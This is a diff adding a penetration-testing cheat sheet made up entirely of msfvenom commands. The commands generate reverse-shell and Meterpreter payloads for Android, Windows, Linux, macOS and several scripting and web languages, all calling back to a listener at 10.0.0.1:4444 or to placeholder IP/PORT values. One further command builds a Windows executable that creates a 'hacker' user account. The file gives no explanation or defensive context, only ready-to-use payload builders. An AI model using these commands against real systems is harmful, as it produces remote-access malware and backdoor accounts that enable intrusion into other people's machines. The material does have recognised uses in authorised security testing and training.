@@ -1,0 +1,38 @@
+# Android reverse shell
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 R > payload.apk
+
+# Windows staged reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > reverse.exe
+
+# Windows Stageless reverse TCP
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > reverse.exe
+
+# Linux Staged reverse TCP
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf >reverse.elf
+
+# Linux Stageless reverse TCP
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf >reverse.elf
+
+# Mac  Reverse Shell
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
+
+# Python Shell
+msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
+
+# PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4444 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+# JSP Shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp 
+
+# ASP Shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
+
+# PERL Shell
+msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl
+
+# Bash
+msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh
+
+# Windows User Add
+msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
